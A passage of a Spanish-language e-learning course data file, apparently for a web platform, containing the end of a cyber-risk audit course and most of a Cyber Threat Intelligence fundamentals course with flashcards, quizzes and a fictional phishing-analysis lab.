                incorrect: "Todas importan, pero las que más diferencia hacen frente a ransomware son la 2 (respaldo restaurado recientemente) y la 3 (MFA en todo acceso remoto y privilegiado)."
              }
            }
          }
        ]
      },
      {
        id: 'aud_final',
        title: "11. 🏁 Su Plan 30-60-90 y Evaluación Final",
        content: [
          { type: 'text', icon: 'CalendarIcon', text: "Su plan 30-60-90 días. A los 30 días: inventario de activos y terceros críticos (use la lista del Reto 1), y hacerle las 7 preguntas a la gerencia. A los 60 días: presenciar una prueba de restauración y revisar los accesos privilegiados y el MFA. A los 90 días: informe al Consejo en lenguaje de negocio, e incluir ciberseguridad en el plan anual de auditoría con KRI." },
          { type: 'text', icon: 'ShieldCheckIcon', text: "Para profundizar: la identidad es el nuevo perímetro. Suplantar a un asociado o a un directivo es la forma más rápida de materializar un riesgo cibernético. La biometría y la criptografía poscuántica (PQC) son los controles que vienen." },
          { type: 'text', icon: 'CheckCircleIcon', text: "Recuerde: la auditoría no evita el ataque, evita que nos encuentre sin preparación. ¡Complete la evaluación final para cerrar el curso!" },
          {
            type: 'h5p_check',
            title: 'Evaluación Final: Auditoría del Riesgo Cibernético',
            description: 'Repaso integral del curso. Cada respuesta correcta suma puntos.',
            questions: [
              {
                question: 'En el caso IFX Networks (2023), ¿por dónde se materializó el riesgo para las entidades afectadas?',
                options: [
                  { id: 'audf1_o1', text: 'Por un proveedor tercero de hosting y conectividad.', isCorrect: true, score: 10 },
                  { id: 'audf1_o2', text: 'Por ataques directos a cada entidad.', isCorrect: false, score: 0 },
                  { id: 'audf1_o3', text: 'Por un error de sus propios empleados.', isCorrect: false, score: 0 }
                ],
                feedback: 'Correcto. Ninguna entidad fue atacada directamente: el riesgo llegó por el proveedor.'
              },
              {
                question: 'En el diagrama de corbatín, los controles preventivos…',
                options: [
                  { id: 'audf2_o1', text: 'Reducen la probabilidad de que ocurra el evento.', isCorrect: true, score: 10 },
                  { id: 'audf2_o2', text: 'Reducen el impacto después del evento.', isCorrect: false, score: 0 },
                  { id: 'audf2_o3', text: 'Solo sirven para cumplir la norma.', isCorrect: false, score: 0 }
                ],
                feedback: 'Correcto. Los preventivos (lado izquierdo) reducen la probabilidad; los de respuesta (lado derecho) reducen el impacto.'
              },
              {
                question: '¿Qué escenario es un correo falso del gerente que ordena una transferencia urgente?',
                options: [
                  { id: 'audf3_o1', text: 'Fraude del "gerente" (BEC).', isCorrect: true, score: 10 },
                  { id: 'audf3_o2', text: 'Ransomware.', isCorrect: false, score: 0 },
                  { id: 'audf3_o3', text: 'Falla de un tercero.', isCorrect: false, score: 0 }
                ],
                feedback: 'Correcto. BEC (Business Email Compromise): fraude por correo corporativo suplantado o comprometido.'
              },
              {
                question: 'En el Modelo de las Tres Líneas, ¿cuál es el papel de la Auditoría Interna?',
                options: [
                  { id: 'audf4_o1', text: 'Asegurar de forma independiente y asesorar (3ª línea).', isCorrect: true, score: 10 },
                  { id: 'audf4_o2', text: 'Operar los controles de seguridad a diario.', isCorrect: false, score: 0 },
                  { id: 'audf4_o3', text: 'Ser dueña del riesgo cibernético.', isCorrect: false, score: 0 }
                ],
                feedback: 'Correcto. Auditoría no opera ni es dueña del riesgo: su valor es la independencia.'
              },
              {
                question: '¿Desde cuándo es obligatorio el Requisito Temático de Ciberseguridad del IIA?',
                options: [
                  { id: 'audf5_o1', text: 'Desde el 5 de febrero de 2026.', isCorrect: true, score: 10 },
                  { id: 'audf5_o2', text: 'Desde enero de 2020.', isCorrect: false, score: 0 },
                  { id: 'audf5_o3', text: 'No es obligatorio en ningún caso.', isCorrect: false, score: 0 }
                ],
                feedback: 'Correcto. Vigente desde el 5 de febrero de 2026, complementa las Normas Globales de Auditoría Interna.'
              },
              {
                question: '¿Qué circular de la Supersolidaria establece los 22 requisitos técnicos mínimos de seguridad de la información?',
                options: [
                  { id: 'audf6_o1', text: 'La Circular Externa 36 de 2022.', isCorrect: true, score: 10 },
                  { id: 'audf6_o2', text: 'La Ley 1581 de 2012.', isCorrect: false, score: 0 },
                  { id: 'audf6_o3', text: 'El NIST CSF 2.0.', isCorrect: false, score: 0 }
                ],
                feedback: 'Correcto. La CE 36 de 2022 (Anexo 2 de la Circular Básica Contable y Financiera, dentro del SARO).'
              },
              {
                question: '¿Qué significa el RTO?',
                options: [
                  { id: 'audf7_o1', text: 'El tiempo máximo que un proceso puede estar detenido antes de que el daño sea inaceptable.', isCorrect: true, score: 10 },
                  { id: 'audf7_o2', text: 'La cantidad de datos que se pueden perder.', isCorrect: false, score: 0 },
                  { id: 'audf7_o3', text: 'El número de vulnerabilidades críticas.', isCorrect: false, score: 0 }
                ],
                feedback: 'Correcto. RTO = tiempo objetivo de recuperación. La cantidad de datos que se pueden perder es el RPO.'
              },
              {
                question: '¿Cuál es la meta sugerida para cuentas privilegiadas y remotas con MFA?',
                options: [
                  { id: 'audf8_o1', text: '100 %.', isCorrect: true, score: 10 },
                  { id: 'audf8_o2', text: '50 %.', isCorrect: false, score: 0 },
                  { id: 'audf8_o3', text: 'Solo las del gerente.', isCorrect: false, score: 0 }
                ],
                feedback: 'Correcto. Toda cuenta privilegiada o con acceso remoto debe tener doble factor.'
              }
            ]
          }
        ]
      }
    ]
  },
  cti_basico: {
    title: "Fundamentos de Cyber Threat Intelligence (CTI)",
    description: "Aprende a convertir datos sobre amenazas en inteligencia útil: el ciclo de inteligencia, fuentes, indicadores, Kill Chain, Modelo Diamante, MITRE ATT&CK y cómo comunicar hallazgos.",
    lastUpdated: "Octubre 2026",
    modules: [
      {
        id: 'cti_intro',
        title: "1. 🕵️ ¿Qué es la Inteligencia de Amenazas?",
        content: [
          { type: 'text', icon: 'UserSearchIcon', text: "La Inteligencia de Amenazas Cibernéticas (CTI, por Cyber Threat Intelligence) es conocimiento basado en evidencia sobre quién podría atacarnos, cómo lo haría y por qué, organizado para que alguien pueda tomar una mejor decisión." },
          {
            type: 'resource',
            title: '📊 Presentación del curso: Fundamentos de CTI',
            description: '25 diapositivas con los conceptos clave del curso, cifras 2025–2026 (IBM, Verizon DBIR, CrowdStrike, Mandiant, MITRE) y referencias. Úsela como guía o para repasar.',
            href: '/materiales/cti/presentacion-cti.html',
            cta: 'Abrir presentación',
          },
          { type: 'text', icon: 'BrainCircuitIcon', text: "La clave está en la diferencia entre dato, información e inteligencia. Una dirección IP es un dato. Saber que esa IP aparece en una campaña de phishing es información. Saber que esa campaña apunta a entidades financieras de Colombia y que hay que bloquearla hoy es inteligencia: contexto + relevancia + acción." },
          {
            type: 'interactive',
            title: 'Los 4 tipos de inteligencia según su audiencia',
            items: [
              { term: 'Estratégica', definition: 'Para la alta dirección. Tendencias, riesgos para el negocio, motivaciones de los actores. Responde: ¿en qué debemos invertir?' },
              { term: 'Operacional', definition: 'Para los equipos de respuesta. Campañas en curso, quién está atacando al sector y cuándo. Responde: ¿qué se nos viene encima?' },
              { term: 'Táctica', definition: 'Para analistas y defensores. Tácticas, técnicas y procedimientos (TTP) de los atacantes. Responde: ¿cómo atacan y cómo los detectamos?' },
              { term: 'Técnica', definition: 'Para herramientas y SOC. Indicadores concretos: IP, dominios, hashes. Responde: ¿qué bloqueamos ahora?' },
            ]
          },
          {
            type: 'quiz',
            quizData: {
              question: "\"El ransomware contra el sector salud en Latinoamérica creció este año y conviene invertir en respaldos fuera de línea.\" ¿Qué tipo de inteligencia es?",
              options: [
                "Técnica.",
                "Estratégica: está dirigida a la dirección y orienta una decisión de inversión.",
                "Táctica."
              ],
              correctOptionIndex: 1,
              feedback: {
                correct: "¡Exacto! Habla de tendencias y de una decisión de negocio, no de indicadores ni de técnicas concretas: es inteligencia estratégica.",
                incorrect: "No. No menciona IP, hashes ni técnicas de ataque: describe una tendencia y orienta una inversión. Es inteligencia estratégica."
              }
            }
          }
        ]
      },
      {
        id: 'cti_cycle',
        title: "2. El Ciclo de Inteligencia",
        content: [
          { type: 'text', icon: 'ServerIcon', text: "La inteligencia no se improvisa: sigue un ciclo que empieza con una pregunta, no con los datos. Si nadie definió qué necesita saber, se termina recolectando todo y no respondiendo nada." },
          { type: 'text', icon: 'QuestionMarkCircleIcon', text: "Los requerimientos de inteligencia prioritarios (PIR, por Priority Intelligence Requirements) son esas preguntas clave. Por ejemplo: \"¿Qué grupos de ransomware están atacando a universidades en Colombia y por dónde entran?\"" },
          {
            type: 'flashcards',
            title: 'Las 6 fases del ciclo de inteligencia',
            cards: [
              { front: '1. Planeación y dirección', back: 'Definir qué necesita saber quién, y para qué decisión. Aquí nacen los PIR.' },
              { front: '2. Recolección', back: 'Reunir datos de las fuentes adecuadas para responder los PIR: registros internos, OSINT, feeds, comunidades.' },
              { front: '3. Procesamiento', back: 'Normalizar, traducir, filtrar duplicados y dar formato a los datos para poder analizarlos.' },
              { front: '4. Análisis', back: 'Convertir la información en conclusiones: conectar hechos, evaluar hipótesis y asignar un nivel de confianza.' },
              { front: '5. Difusión', back: 'Entregar el producto a quien lo necesita, en el formato y el momento adecuados.' },
              { front: '6. Retroalimentación', back: 'Preguntar al consumidor si le sirvió. Lo que responda ajusta los PIR y reinicia el ciclo.' },
            ]
          },
          {
            type: 'quiz',
            quizData: {
              question: "Un equipo descarga 50 feeds de indicadores sin saber qué preguntas debe responder. ¿Qué fase del ciclo se saltó?",
              options: [
                "Difusión.",
                "Planeación y dirección: sin PIR no se sabe qué recolectar ni para qué.",
                "Procesamiento."
              ],
              correctOptionIndex: 1,
              feedback: {
                correct: "Correcto. Recolectar sin requerimientos genera ruido. Todo empieza por definir qué decisión debe apoyar la inteligencia.",
                incorrect: "No. El problema de origen es no tener requerimientos (PIR): sin la fase de planeación, la recolección no tiene rumbo."
              }
            }
          }
        ]
      },
      {
        id: 'cti_sources',
        title: "3. Fuentes y Confiabilidad",
        content: [
          { type: 'text', icon: 'ClosedEnvelopeIcon', text: "Las fuentes de CTI se dividen en internas (registros del firewall, del correo, del EDR, incidentes previos) y externas: OSINT (fuentes abiertas), feeds comerciales o gratuitos, informes de fabricantes, boletines de CSIRT nacionales y comunidades de intercambio sectoriales (ISAC)." },
          { type: 'text', icon: 'LockIcon', text: "No toda fuente vale lo mismo. El sistema del Almirantazgo (Admiralty Code) califica por separado la confiabilidad de la fuente (de A, completamente confiable, a F, no se puede juzgar) y la credibilidad de la información (de 1, confirmada por otras fuentes, a 6, no se puede juzgar). Así, un dato \"B2\" viene de una fuente usualmente confiable y es probablemente cierto." },
          {
            type: 'memory',
            title: 'Asocie cada fuente con su tipo',
            pairs: [
              { term: 'Registros del firewall propio', definition: 'Fuente interna.' },
              { term: 'Publicación de un investigador en un blog', definition: 'OSINT (fuente abierta).' },
              { term: 'Alerta de un CSIRT nacional', definition: 'Boletín de una entidad de respuesta.' },
              { term: 'Grupo de intercambio entre bancos', definition: 'Comunidad sectorial (ISAC).' },
            ]
          },
          {
            type: 'quiz',
            quizData: {
              question: "Una cuenta anónima en un foro, sin historial, afirma que una universidad fue hackeada, y nadie más lo confirma. ¿Qué calificación del Almirantazgo es más adecuada?",
              options: [
                "A1: completamente confiable y confirmada.",
                "F6: la confiabilidad de la fuente y la veracidad de la información no se pueden juzgar todavía.",
                "B2: usualmente confiable y probablemente cierta."
              ],
              correctOptionIndex: 1,
              feedback: {
                correct: "Correcto. Sin historial de la fuente y sin confirmación, lo honesto es F6. No se descarta, pero tampoco se reporta como un hecho.",
                incorrect: "No. Una fuente sin historial y una afirmación sin confirmar no pueden calificarse alto. Lo adecuado es F6 hasta tener más evidencia."
              }
            }
          }
        ]
      },
      {
        id: 'cti_pyramid',
        title: "4. Indicadores y la Pirámide del Dolor",
        content: [
          { type: 'text', icon: 'BugIcon', text: "Un indicador de compromiso (IoC) es una huella observable de una intrusión: un hash de malware, una IP, un dominio, una clave de registro. Son útiles, pero cambian rápido: el atacante puede cambiar de IP en minutos." },
          { type: 'text', icon: 'ShieldCheckIcon', text: "La Pirámide del Dolor (David Bianco, 2013) ordena los indicadores según cuánto le \"duele\" al atacante que los detectemos. En la base, lo trivial de cambiar; en la cima, lo que más le cuesta: sus TTP, es decir, su forma de operar." },
          {
            type: 'flashcards',
            title: 'Suba la pirámide: de lo fácil a lo doloroso para el atacante',
            cards: [
              { front: '1. Hashes', back: 'Trivial: cambiar un solo byte del malware genera un hash nuevo.' },
              { front: '2. Direcciones IP', back: 'Fácil: el atacante usa otro servidor o una VPN.' },
              { front: '3. Nombres de dominio', back: 'Simple: registrar un dominio nuevo cuesta poco.' },
              { front: '4. Artefactos de red y de host', back: 'Molesto: patrones en el tráfico, rutas o claves de registro que delatan su herramienta.' },
              { front: '5. Herramientas', back: 'Desafiante: tiene que conseguir o desarrollar otra herramienta.' },
              { front: '6. TTP', back: 'Difícil: tiene que cambiar su forma de operar. Detectar comportamientos es lo que más le duele.' },
            ]
          },
          {
            type: 'memory',
            title: 'Clasifique cada indicador en la pirámide',
            pairs: [
              { term: 'e3b0c442…b855', definition: 'Hash (base de la pirámide).' },
              { term: '203.0.113.45', definition: 'Dirección IP.' },
              { term: 'banco-actualiza-datos.example', definition: 'Nombre de dominio.' },
              { term: 'Robar credenciales volcando la memoria de LSASS', definition: 'TTP (cima de la pirámide).' },
            ]
          },
          {
            type: 'quiz',
            quizData: {
              question: "¿Por qué una regla que detecta el comportamiento \"PowerShell descarga y ejecuta un archivo desde internet\" es más valiosa que bloquear 100 IP?",
              options: [
                "Porque bloquear IP es ilegal.",
                "Porque detecta una técnica (TTP): el atacante puede cambiar de IP en minutos, pero cambiar su forma de operar le cuesta mucho más.",
                "Porque PowerShell siempre es malicioso."
              ],
              correctOptionIndex: 1,
              feedback: {
                correct: "Correcto. Es subir en la Pirámide del Dolor: las IP son baratas para el atacante, sus técnicas no.",
                incorrect: "No. La razón es la Pirámide del Dolor: las IP cambian fácilmente; los comportamientos (TTP) son lo más costoso de cambiar para el atacante."
              }
            }
          }
        ]
      },
      {
        id: 'cti_killchain',
        title: "5. Cyber Kill Chain: el Ataque Paso a Paso",
        content: [
          { type: 'text', icon: 'ServerIcon', text: "La Cyber Kill Chain, propuesta por Lockheed Martin en 2011, divide una intrusión en 7 fases. Su idea central: si el defensor rompe cualquier eslabón, la cadena del ataque se corta." },
          {
            type: 'flashcards',
            title: 'Las 7 fases de la Kill Chain',
            cards: [
              { front: '1. Reconocimiento', back: 'El atacante investiga a la víctima: correos, empleados, tecnologías expuestas.' },
              { front: '2. Armado (weaponization)', back: 'Prepara el arma: por ejemplo, un documento con una macro maliciosa.' },
              { front: '3. Entrega', back: 'Hace llegar el arma: correo de phishing, USB, sitio web comprometido.' },
              { front: '4. Explotación', back: 'Se ejecuta el código aprovechando una vulnerabilidad o un clic del usuario.' },
              { front: '5. Instalación', back: 'Instala malware o una puerta trasera para mantener el acceso.' },
              { front: '6. Comando y control (C2)', back: 'El equipo infectado se comunica con el servidor del atacante para recibir órdenes.' },
              { front: '7. Acciones sobre el objetivo', back: 'Logra su meta: robar datos, cifrar sistemas, defraudar.' },
            ]
          },
          {
            type: 'memory',
            title: '¿En qué fase ocurre?',
            pairs: [
              { term: 'Buscan en LinkedIn a los empleados de finanzas', definition: 'Reconocimiento.' },
              { term: 'Llega un correo con una "factura" adjunta', definition: 'Entrega.' },
              { term: 'El equipo se conecta cada 5 minutos a un dominio extraño', definition: 'Comando y control (C2).' },
              { term: 'Copian la base de datos de clientes a un servidor externo', definition: 'Acciones sobre el objetivo.' },
            ]
          },
          {
            type: 'quiz',
            quizData: {
              question: "El filtro de correo bloquea el adjunto malicioso antes de que llegue al usuario. ¿En qué fase se cortó la cadena?",
              options: [
                "En la entrega.",
                "En las acciones sobre el objetivo.",
                "En el reconocimiento."
              ],
              correctOptionIndex: 0,
              feedback: {
                correct: "Correcto. El arma nunca llegó a la víctima: la cadena se rompió en la fase de entrega, y todo lo que seguía ya no ocurre.",
                incorrect: "No. El adjunto no alcanzó al usuario: la cadena se rompió en la fase de entrega."
              }
            }
          }
        ]
      },
      {
        id: 'cti_diamond',
        title: "6. El Modelo Diamante",
        content: [
          { type: 'text', icon: 'BrainCircuitIcon', text: "El Modelo Diamante de análisis de intrusiones (Caltagirone, Pendergast y Betz, 2013) describe cada evento con 4 vértices conectados: un adversario usa una capacidad sobre una infraestructura contra una víctima." },
          { type: 'text', icon: 'PointerIcon', text: "Su gran ventaja es el pivoteo: si conocemos un vértice, podemos descubrir los demás. Por ejemplo, de un dominio (infraestructura) se llega a otros dominios registrados con el mismo correo, y de ahí a otras víctimas de la misma campaña." },
          {
            type: 'memory',
            title: 'Arme el diamante',
            pairs: [
              { term: 'Adversario', definition: 'Quién está detrás: un grupo criminal, un actor estatal, un insider.' },
              { term: 'Capacidad', definition: 'Con qué ataca: el malware, el exploit, la técnica.' },
              { term: 'Infraestructura', definition: 'Por dónde opera: dominios, IP, servidores de C2, cuentas de correo.' },
              { term: 'Víctima', definition: 'A quién ataca: la organización, la persona o el sistema afectado.' },
            ]
          },
          {
            type: 'quiz',
            quizData: {
              question: "Descubre que el dominio usado en un phishing fue registrado con un correo que también registró otros 12 dominios. ¿Qué está haciendo?",
              options: [
                "Pivotear desde la infraestructura para descubrir más infraestructura (y posiblemente más víctimas) del mismo adversario.",
                "Atribuir el ataque con certeza a un país.",
                "Analizar la capacidad del malware."
              ],
              correctOptionIndex: 0,
              feedback: {
                correct: "¡Exacto! Eso es pivotear en el vértice de infraestructura. Los otros 12 dominios pueden revelar el resto de la campaña.",
                incorrect: "No. Ir de un dominio a otros relacionados es pivotear sobre la infraestructura. No basta para atribuir con certeza."
              }
            }
          }
        ]
      },
      {
        id: 'cti_attack',
        title: "7. MITRE ATT&CK: el Lenguaje Común",
        content: [
          { type: 'text', icon: 'DocumentTextIcon', text: "MITRE ATT&CK es una base de conocimiento pública y gratuita de tácticas y técnicas reales de atacantes, construida a partir de incidentes observados. Le da a defensores, analistas y proveedores un vocabulario común." },
          { type: 'text', icon: 'ServerIcon', text: "Se organiza en una matriz. La matriz Enterprise tiene 15 tácticas (el \"por qué\" de cada paso del atacante; desde la versión 19, de abril de 2026, la táctica Evasión de defensas se dividió en Sigilo y Debilitamiento de las defensas), y cada táctica contiene técnicas y subtécnicas (el \"cómo\"), cada una con un identificador. Por ejemplo, T1566 es Phishing y T1486 es Cifrado de datos para causar impacto (ransomware)." },
          {
            type: 'interactive',
            title: 'Algunas de las 15 tácticas de ATT&CK Enterprise',
            items: [
              { term: 'Acceso inicial (Initial Access)', definition: 'Entrar a la red. Ej.: T1566 Phishing.' },
              { term: 'Ejecución (Execution)', definition: 'Correr código malicioso. Ej.: T1059 Intérprete de comandos y scripts.' },
              { term: 'Persistencia (Persistence)', definition: 'Mantener el acceso aunque se reinicie el equipo o cambien contraseñas.' },
              { term: 'Acceso a credenciales (Credential Access)', definition: 'Robar usuarios y contraseñas. Ej.: T1003 Volcado de credenciales del sistema.' },
              { term: 'Movimiento lateral (Lateral Movement)', definition: 'Pasar de un equipo a otro dentro de la red.' },
              { term: 'Exfiltración (Exfiltration)', definition: 'Sacar los datos robados de la organización.' },
              { term: 'Impacto (Impact)', definition: 'Dañar, cifrar o interrumpir. Ej.: T1486 Cifrado de datos para causar impacto.' },
            ]
          },
          {
            type: 'memory',
            title: 'Asocie la técnica con su táctica',
            pairs: [
              { term: 'T1566 Phishing', definition: 'Acceso inicial.' },
              { term: 'T1059 Intérprete de comandos y scripts', definition: 'Ejecución.' },
              { term: 'T1003 Volcado de credenciales', definition: 'Acceso a credenciales.' },
              { term: 'T1486 Cifrado de datos para causar impacto', definition: 'Impacto.' },
            ]
          },
          {
            type: 'quiz',
            quizData: {
              question: "En ATT&CK, ¿cuál es la diferencia entre una táctica y una técnica?",
              options: [
                "Son sinónimos.",
                "La táctica es el objetivo del atacante en ese paso (el porqué); la técnica es la forma concreta de lograrlo (el cómo).",
                "La técnica es el objetivo y la táctica es la herramienta."
              ],
              correctOptionIndex: 1,
              feedback: {
                correct: "Correcto. Por ejemplo, la táctica \"Acceso inicial\" (porqué) se puede lograr con la técnica \"Phishing\" (cómo).",
                incorrect: "No. La táctica es el objetivo (por ejemplo, acceso inicial) y la técnica es el medio concreto (por ejemplo, phishing)."
              }
            }
          }
        ]
      },
      {
        id: 'cti_actors',
        title: "8. Actores de Amenaza y Atribución",
        content: [
          { type: 'text', icon: 'SpyIcon', text: "Conocer al adversario ayuda a anticipar su próximo paso. Los grandes grupos se rastrean con nombres que cambian según quién los reporta: el mismo actor puede tener tres o cuatro alias distintos, según el fabricante que lo describe." },
          { type: 'text', icon: 'QuestionMarkCircleIcon', text: "Atribuir es difícil y riesgoso: los atacantes usan infraestructura prestada, imitan a otros grupos y dejan pistas falsas (operaciones de bandera falsa). Por eso un buen analista separa los hechos de las hipótesis, considera explicaciones alternativas y siempre declara su nivel de confianza: bajo, moderado o alto." },
          {
            type: 'flashcards',
            title: 'Tipos de actores y qué buscan',
            cards: [
              { front: 'Grupos de cibercrimen', back: 'Dinero: ransomware, fraude, robo y venta de datos. Operan como empresas, con afiliados y servicios.' },
              { front: 'Actores estatales (APT)', back: 'Espionaje, sabotaje o ventaja geopolítica. Persistentes y con muchos recursos.' },
              { front: 'Hacktivistas', back: 'Una causa política o social. Desfiguraciones, filtraciones y denegación de servicio.' },
              { front: 'Insiders', back: 'Personas de adentro con acceso legítimo, por dinero, venganza o descuido.' },
            ]
          },
          {
            type: 'quiz',
            quizData: {
              question: "El malware de un ataque tiene comentarios en ruso en su código. ¿Qué debe concluir el analista?",
              options: [
                "Que el ataque fue hecho por el gobierno ruso, con alta confianza.",
                "Que es un indicio entre varios, que puede ser una pista falsa; por sí solo no permite atribuir y la confianza sería baja.",
                "Que hay que ignorar el dato."
              ],
              correctOptionIndex: 1,
              feedback: {
                correct: "Correcto. Un idioma en el código es fácil de falsificar. Se registra como indicio, se contrasta con otras evidencias y se declara una confianza baja.",
                incorrect: "No. Los rastros de idioma son fáciles de plantar. No se ignoran, pero solos no permiten atribuir: confianza baja hasta tener más evidencia."
              }
            }
          }
        ]
      },
      {
        id: 'cti_sharing',
        title: "9. Compartir Inteligencia: TLP, STIX y MISP",
        content: [
          { type: 'text', icon: 'HappyUsersIcon', text: "La inteligencia gana valor cuando se comparte: lo que una organización detecta hoy puede proteger a otra mañana. Pero hay que compartir con reglas claras." },
          { type: 'text', icon: 'DocumentTextIcon', text: "Para el intercambio automatizado existen estándares: STIX (formato para describir amenazas: indicadores, actores, campañas, técnicas) y TAXII (protocolo para transportarlos), ambos de OASIS. MISP es una plataforma de código abierto muy usada por CSIRT y comunidades para almacenar y compartir esa información." },
          {
            type: 'interactive',
            title: 'TLP 2.0 (FIRST): ¿con quién puedo compartir?',
            items: [
              { term: 'TLP:RED', definition: 'Solo para los presentes en la reunión o los destinatarios directos. No se comparte con nadie más.' },
              { term: 'TLP:AMBER+STRICT', definition: 'Solo dentro de la organización del destinatario.' },
              { term: 'TLP:AMBER', definition: 'Dentro de la organización del destinatario y con sus clientes, cuando necesiten saberlo para protegerse.' },
              { term: 'TLP:GREEN', definition: 'Con la comunidad (por ejemplo, el sector), pero no en canales públicos.' },
              { term: 'TLP:CLEAR', definition: 'Sin restricción: se puede publicar.' },
            ]
          },
          {
            type: 'quiz',
            quizData: {
              question: "Recibe un informe marcado TLP:AMBER+STRICT. ¿Puede reenviarlo a un colega de otra universidad?",
              options: [
                "Sí, porque también es del sector educativo.",
                "No: AMBER+STRICT solo permite compartirlo dentro de su propia organización.",
                "Sí, si le quita el logo."
              ],
              correctOptionIndex: 1,
              feedback: {
                correct: "Correcto. AMBER+STRICT no sale de su organización. Si quiere compartirlo, pida autorización a quien lo emitió.",
                incorrect: "No. TLP:AMBER+STRICT limita el informe a su organización. Reenviarlo rompe la confianza de la comunidad que lo compartió."
              }
            }
          }
        ]
      },
      {
        id: 'cti_report',
        title: "10. 🧪 Laboratorio: Su Primer Informe de Inteligencia",
        content: [
          { type: 'text', icon: 'DocumentTextIcon', text: "Un informe de inteligencia empieza por la conclusión (BLUF, por Bottom Line Up Front): en las primeras líneas, qué pasa, qué tan seguro está y qué se recomienda hacer. Los detalles van después." },
          { type: 'text', icon: 'AlarmIcon', text: "Caso ficticio: varios funcionarios de una universidad reciben un correo \"de Rectoría\" con el asunto \"Actualización de nómina\" que lleva a un formulario en el dominio rectoria-nomina-universidad.example (registrado hace 3 días). Dos personas ingresaron su contraseña. Al día siguiente, una de esas cuentas inicia sesión desde otro país y crea una regla para reenviar todo su correo hacia afuera." },
          {
            type: 'activity',
            title: 'Laboratorio: analice el caso y redacte su informe',
            duration: '25–30 min',
            groupSize: 'Individual o en parejas',
            goal: 'Aplicar las herramientas del curso a un caso y producir un informe corto de inteligencia, con conclusión, nivel de confianza y recomendaciones.',
            downloads: [],
            steps: [
              { title: 'Extraiga los indicadores', minutes: '5 min', detail: 'Liste los IoC del caso (dominio, asunto del correo, país del inicio de sesión) y ubíquelos en la Pirámide del Dolor. ¿Cuál sería la TTP?' },
              { title: 'Ubique la Kill Chain', minutes: '5 min', detail: 'Ordene lo ocurrido en las 7 fases. ¿En cuáles se pudo haber cortado la cadena?' },
              { title: 'Mapee con ATT&CK', minutes: '5 min', detail: 'Identifique al menos dos técnicas. Pista: T1566 Phishing (acceso inicial) y T1114 Recolección de correo electrónico (incluye las reglas de reenvío).' },
              { title: 'Arme el diamante', minutes: '5 min', detail: 'Complete los 4 vértices. ¿Qué sabe del adversario? Probablemente poco: declárelo con confianza baja.' },
              { title: 'Redacte el BLUF', minutes: '5–10 min', detail: 'En máximo 5 líneas: qué pasó, nivel de confianza, a quién afecta y 3 acciones recomendadas (por ejemplo, bloquear el dominio, restablecer contraseñas, activar MFA y revisar reglas de reenvío). Asígnele un TLP.' },
            ],
            closing: 'Compare su informe con el de un compañero: ¿llegaron a las mismas conclusiones? ¿Declararon el mismo nivel de confianza?',
          },
          {
            type: 'quiz',
            quizData: {
              question: "En el caso, ¿qué recomendación ataca la TTP y no solo el indicador?",
              options: [
                "Bloquear el dominio rectoria-nomina-universidad.example.",
                "Activar MFA y alertar sobre la creación de reglas de reenvío externo, para que una contraseña robada no baste y el robo de correo se detecte.",
                "Bloquear la IP del país desde donde se conectaron."
              ],
              correctOptionIndex: 1,
              feedback: {
                correct: "Correcto. El atacante puede registrar otro dominio o usar otra IP mañana; el MFA y la detección del reenvío frenan su forma de operar.",
                incorrect: "Bloquear el dominio o la IP sirve hoy, pero el atacante los cambia fácilmente. Lo que ataca la TTP es el MFA y detectar las reglas de reenvío."
              }
            }
          }
        ]
      },
      {
        id: 'cti_final',
        title: "11. 🏁 Evaluación Final",
        content: [
          { type: 'text', icon: 'CheckCircleIcon', text: "Completó los fundamentos de Cyber Threat Intelligence: tipos de inteligencia, ciclo, fuentes, Pirámide del Dolor, Kill Chain, Modelo Diamante, MITRE ATT&CK, atribución y TLP. ¡Demuestre lo que aprendió!" },
          {
            type: 'h5p_check',
            title: 'Evaluación Final: Fundamentos de CTI',
            description: 'Repaso integral del curso. Cada respuesta correcta suma puntos.',
            questions: [
              {
                question: '¿Qué convierte la información en inteligencia?',
                options: [
                  { id: 'ctif1_o1', text: 'El contexto y la relevancia para tomar una decisión.', isCorrect: true, score: 10 },
                  { id: 'ctif1_o2', text: 'La cantidad de datos recolectados.', isCorrect: false, score: 0 },
                  { id: 'ctif1_o3', text: 'Que provenga de una fuente pagada.', isCorrect: false, score: 0 }
                ],
                feedback: 'Correcto. La inteligencia es información con contexto, relevante y accionable.'
              },
              {
                question: '¿Con qué fase empieza el ciclo de inteligencia?',
                options: [
                  { id: 'ctif2_o1', text: 'Planeación y dirección (definir los PIR).', isCorrect: true, score: 10 },
                  { id: 'ctif2_o2', text: 'Recolección.', isCorrect: false, score: 0 },
                  { id: 'ctif2_o3', text: 'Difusión.', isCorrect: false, score: 0 }
                ],
                feedback: 'Correcto. Primero se define qué se necesita saber y para qué decisión.'
              },
              {
                question: 'En la Pirámide del Dolor, ¿qué es lo más difícil de cambiar para el atacante?',
                options: [
                  { id: 'ctif3_o1', text: 'Sus TTP (tácticas, técnicas y procedimientos).', isCorrect: true, score: 10 },
                  { id: 'ctif3_o2', text: 'Sus direcciones IP.', isCorrect: false, score: 0 },
                  { id: 'ctif3_o3', text: 'Los hashes de su malware.', isCorrect: false, score: 0 }
                ],
                feedback: 'Correcto. Las TTP están en la cima: cambiarlas le cuesta mucho al atacante.'
              },
              {
                question: 'En la Kill Chain, la comunicación del equipo infectado con el servidor del atacante corresponde a…',
                options: [
                  { id: 'ctif4_o1', text: 'Comando y control (C2).', isCorrect: true, score: 10 },
                  { id: 'ctif4_o2', text: 'Reconocimiento.', isCorrect: false, score: 0 },
                  { id: 'ctif4_o3', text: 'Armado.', isCorrect: false, score: 0 }
                ],
                feedback: 'Correcto. Es la fase 6: el equipo recibe órdenes del atacante.'
              },
              {
                question: '¿Cuáles son los 4 vértices del Modelo Diamante?',
                options: [
                  { id: 'ctif5_o1', text: 'Adversario, capacidad, infraestructura y víctima.', isCorrect: true, score: 10 },
                  { id: 'ctif5_o2', text: 'Fuente, dato, información e inteligencia.', isCorrect: false, score: 0 },
                  { id: 'ctif5_o3', text: 'Hash, IP, dominio y TTP.', isCorrect: false, score: 0 }
                ],
                feedback: 'Correcto. Conocer un vértice permite pivotear hacia los demás.'
              },
              {
                question: 'En MITRE ATT&CK, T1566 Phishing es una técnica de la táctica…',
                options: [
                  { id: 'ctif6_o1', text: 'Acceso inicial.', isCorrect: true, score: 10 },
                  { id: 'ctif6_o2', text: 'Exfiltración.', isCorrect: false, score: 0 },
                  { id: 'ctif6_o3', text: 'Impacto.', isCorrect: false, score: 0 }
                ],
                feedback: 'Correcto. El phishing es una de las formas más comunes de lograr el acceso inicial.'
              },
              {
